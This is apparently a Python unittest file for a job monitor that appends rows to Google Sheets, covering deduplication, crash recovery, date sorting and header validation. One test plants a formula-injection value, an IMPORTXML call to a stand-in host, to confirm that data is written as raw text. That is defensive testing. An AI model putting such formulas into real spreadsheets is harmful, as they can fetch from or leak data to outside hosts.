import unittest
from unittest.mock import patch
from monitor.sheets import GoogleSheet, HEADERS, row, date_serial
from monitor.run import process
from test_monitor import job


class SheetTests(unittest.TestCase):
    def sink(self):
        sink=GoogleSheet.__new__(GoogleSheet)
        sink.url='https://sheets.googleapis.com/v4/spreadsheets/test'
        sink.token='test'
        sink.delivery_key='sheets:test'
        sink.format_rows=lambda first,last:None
        return sink

    def result(self):
        return process([job()], {'skills':['python']}, {}, now='2026-10-26T12:00:00+00:00')[0]

    def test_raw_text_and_numbers(self):
        sink=self.sink()
        sink.read=lambda:set()
        value=self.result()
        value['company']='=IMPORTXML("https://bad.test","x")'
        with patch('monitor.sheets.request',return_value={'updates':{'updatedRows':1,'updatedRange':"'Jobs'!A6:T6"}}) as send:
            sink.append([value,value])
            self.assertIn('valueInputOption=RAW',send.call_args.args[0])
            rows=send.call_args.args[1]['values']
            self.assertEqual(len(rows),1)
            self.assertEqual(rows[0][0],value['company'])
            self.assertEqual(rows[0][2],0.5)
            self.assertEqual(len(rows[0]),len(HEADERS))

    def test_reconcile_successful_write_after_crash(self):
        sink=self.sink()
        value=self.result()
        sink.read=lambda:{value['key']}
        with patch('monitor.sheets.request') as send:
            self.assertEqual(sink.append([value]),{value['key']})
            send.assert_not_called()

    def test_failed_write_does_not_mark_delivered(self):
        sink=self.sink()
        sink.read=lambda:set()
        state={}
        with patch('monitor.sheets.request',side_effect=TimeoutError):
            with self.assertRaises(TimeoutError):
                process([job()], {'skills':['python']}, state, sink)
        self.assertFalse(any(v.get('reported_to') for v in state.values()))

    def test_migrate_legacy_state_without_skipping_sheet(self):
        value=self.result()
        state={value['key']:{'first_seen':value['first_seen'],'reported':True}}
        sink=self.sink()
        sink.read=lambda:{value['key']}
        with patch('monitor.sheets.request') as send:
            self.assertEqual(len(process([job()],{'skills':['python']},state,sink)),1)
            self.assertEqual(process([job()],{'skills':['python']},state,sink),[])
            send.assert_not_called()
        self.assertTrue(state[value['key']]['reported'])

    def test_date_sortability_and_missing_date(self):
        self.assertEqual(date_serial(None),'')
        self.assertEqual(date_serial('2026-10-26T12:00:00Z'),date_serial('2026-10-26T05:00:00-07:00'))
        self.assertLess(date_serial('2026-10-25'),date_serial('2026-10-26'))

    def test_changed_headers_and_missing_ids_fail_closed(self):
        sink=self.sink()
        for values in ([['Wrong header']], [HEADERS,['Manual row without ID']]):
            with patch('monitor.sheets.request',return_value={'values':values}):
                with self.assertRaises(ValueError):
                    sink.read()

    def test_duplicate_existing_ids_fail_closed(self):
        sink=self.sink()
        values=[HEADERS,row(self.result()),row(self.result())]
        with patch('monitor.sheets.request',return_value={'values':values}):
            with self.assertRaises(ValueError):
                sink.read()


if __name__=='__main__':
    unittest.main()
